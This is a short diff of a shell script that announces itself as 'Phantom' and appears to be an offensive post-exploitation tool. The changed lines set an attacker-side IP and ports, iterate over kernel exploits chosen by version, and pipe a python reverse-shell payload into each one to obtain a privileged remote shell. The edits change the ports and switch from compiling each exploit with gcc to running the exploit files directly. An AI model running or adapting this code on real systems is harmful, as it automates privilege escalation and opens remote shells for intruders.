@@ -2,8 +2,8 @@
 
 ip="10.0.2.2"
 port2="9999"
-portp="15346"
-portr="15589"
+portp="15001"
+portr="15495"
 
 echo "---Phantom started---"
 #find the user making the connection
@@ -79,14 +79,12 @@ EOF
         if [ $minor -le $j ]; then
           exploits_final_array=($(ls /tmp/$ip:$portp/exploits/$i/$j))
           for k in $exploits_final_array; do
-            gcc -o /tmp/a.out -pthread /tmp/$ip:$portp/exploits/$i/$j/$k &>/dev/null
-            echo $python_reverse | /tmp/a.out &>/dev/null
+            echo $python_reverse | /tmp/$ip:$portp/exploits/$i/$j/$k &>/dev/null
           done
         fi
       done
     fi
   done
-  rm /tmp/a.out
   exit
 fi
 
